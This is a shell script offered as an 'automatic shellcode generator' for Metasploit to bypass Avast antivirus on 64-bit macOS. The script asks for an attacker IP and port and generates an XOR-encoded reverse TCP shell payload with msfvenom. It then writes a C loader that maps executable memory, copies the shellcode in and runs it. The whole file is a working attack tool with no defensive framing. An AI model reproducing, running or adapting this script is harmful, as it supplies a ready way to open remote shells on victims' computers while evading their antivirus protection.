clear  
echo "************************************************************"
echo "    Automatic  shellcode generator - FOR METASPLOIT         "
echo "         For OSX 64bit Antivirus bypass (Avast)             "     
echo "************************************************************"
echo -e "What IP are we gonna use ?  \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo '[*] Checking if metasploit msfvenom is present..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path ........ good'
else
   echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 
echo '[*] Cleaning up ' 
rm -f osx64-payload.c
./msfvenom -p osx/x64/shell_reverse_tcp EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform OSX -e x64/xor -f c -o test.c
echo "#include <stdio.h>" > temp.c 
echo '#include <sys/types.h>' >> temp.c
echo '#include <sys/ipc.h>' >> temp.c
echo '#include <sys/msg.h>' >> temp.c
echo '#include <string.h>' >> temp.c
echo '#include <sys/mman.h>' >> temp.c
echo '#include <fcntl.h>' >> temp.c
echo '#include <sys/socket.h>' >> temp.c
echo '#include <stdlib.h>' >> temp.c
echo '#include <errno.h>' >> temp.c
echo '#include <sys/mman.h>' >> temp.c
echo '#include <sys/types.h>' >> temp.c
echo '#include <sys/stat.h>' >> temp.c
echo '#include <sys/ioctl.h>' >> temp.c
echo '#include <unistd.h>' >> temp.c
echo '#include <strings.h>' >> temp.c
echo '#include <unistd.h>' >> temp.c
echo '#include <poll.h>' >> temp.c
echo '#include <pthread.h>' >> temp.c 
echo '#include <stdint.h>' >> temp.c 
echo '' >> temp.c 
cat test.c >> temp.c 
echo '' >> temp.c
echo 'int main(int argc, char **argv)' >> temp.c
echo '{' >> temp.c
echo 'void *ptr = mmap(0, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);' >> temp.c
echo 'printf("ret: 0x%x",ptr);' >> temp.c
echo 'memcpy(ptr,buf,sizeof buf);' >> temp.c
echo 'void (*fp)() = (void (*)())ptr;' >> temp.c
echo 'fp();' >> temp.c
echo '' >> temp.c
echo '}' >> temp.c
mv temp.c osx64-payload.c
if [ -f  ./osx64-payload.c ]; then
echo '[*] osx64-payoad.c generated ...'
ls -la osx64-payload.c
else
   echo '[-] Something went wrong  .. '
exit 0
fi




